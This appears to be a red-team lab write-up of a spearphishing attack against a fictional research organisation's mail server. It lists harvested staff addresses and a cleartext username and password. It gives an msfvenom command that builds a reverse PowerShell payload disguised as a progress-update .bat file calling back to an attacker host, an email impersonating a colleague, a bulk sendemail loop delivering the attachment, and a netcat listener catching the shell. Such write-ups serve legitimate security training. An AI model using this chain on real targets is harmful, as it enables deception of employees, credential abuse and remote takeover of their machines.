# Phishing

- [123](#123)

----

## Email collected

So far we have collected the following email information:

* (SSL Cert Admin / Senior Scientist)
iyer@atomic-nuclear.site

```
UserName: iyer
Passwd: Iyer@123
Port: 110,143
```

* (SSL Cert Admin)
admin@atomic-nuclear.site
* (Senior Principal Scientist)
homi@atomic-nuclear.site

<br/>

Note a mail server is availableon `192.168.8.3` (`atomic-nuclear.site`):

> - Mail:
>   - tcp/25, tcp/110, tcp/143
>   - Dovecot

<br/>

## Phishing Preparation

> Technique:<br/>
> T1566.001 Spearphishing Attachment<br/>
> https://attack.mitre.org/techniques/T1566/001/

<br/>

Prepare a reverse powershell payload (in `.bat` format) using `msfvenom`:

```
msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.100.11 LPORT=443 > ProgressUpdate.bat
```
![picture 1](images/eabdaf72b7ec27178a42cab94c3f16da8719979633a88303e598c20deee8c4bc.png)  

<br/>

Prepare a list of collected emails:
```
cat >> emails.txt<<EOF
> iyer@atomic-nuclear.site
> admin@atomic-nuclear.site
> homi@atomic-nuclear.site
> 
> EOF
```
![picture 2](images/377a6d99e9225dc7742dfbd1278bec57ea413ae46ab16fa7f17c304314f33de6.png)  

<br/>

Prepare a phishing message, impersonating one of the found person in the target organization `Hafiz`:
```
cat >> email_msg.txt <<EOF
> Hello,
> 
> Please find the research progress update in the attached. This update is really important and make sure you check it out.
> 
> Regards,
> Hafiz
> EOF
```

![picture 3](images/507ed2a1e185c0d35bad488da9c3fae39f921fe75abbbae3ed2d8711b3d34fa0.png)  

<br/>

## Exploitation

First launch a netcat listener:

```
nc -nlvp 443
```

<br/>


Then send phishing emails with attachment to the target emails:

```
for email in $(cat emails.txt); do sendemail -l email.log -f "hafiz@atomic-nuclear.xyz" -u "[IMPORTANT] Research Progress Update" -m $(cat email_msg.txt) -t "$email" -s "atomic-nuclear.site:25" -o tls=no -a ProgressUpdate.bat; done
```

![picture 4](images/de6aed4aa9572e26355372c879d210a380ab94599617d3b24a96b00fe065e518.png)  

* As shown, the email message was delivered to `iyer@atomic-nuclear.site` successfully.

<br/>

After a while, a reverse shell calls back to the netcat listener:

![picture 5](images/ae8fb0ede98b09646283564e242e64f1b53d74852e27a583fa34e40c5f8da0b2.png)  

<br/>

